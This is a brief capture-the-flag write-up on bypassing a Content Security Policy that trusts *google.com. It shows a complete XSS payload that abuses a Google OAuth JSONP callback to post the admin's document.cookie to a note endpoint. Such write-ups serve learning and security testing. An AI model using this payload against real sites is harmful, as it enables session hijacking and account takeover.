CTFd —  bypassing CSP

Content Security Policy on website is meant to disallow arbitrary javascript scripts/resources being loaded on a website from unknown sources.

The policy mentions the domains from which resources/scripts may be loaded.  This CTF challenge had a policy that disallowed inline scripts (good job) but allowed scripts from *google.com

Since google was allowed, I used the following to bounce off an alert script which worked

Next, script to display document.cookie and reporting the note to admin to steal the admin’s cookie!

Payload:

<script src="https://accounts.google.com/o/oauth2/revoke?callback=%24.post%28%27/note/new%27%2C%7Btitle%3A%20%22cookie%20sponsored%22%2C%20content%3A%20document.cookie%7D%29%3B"></script>
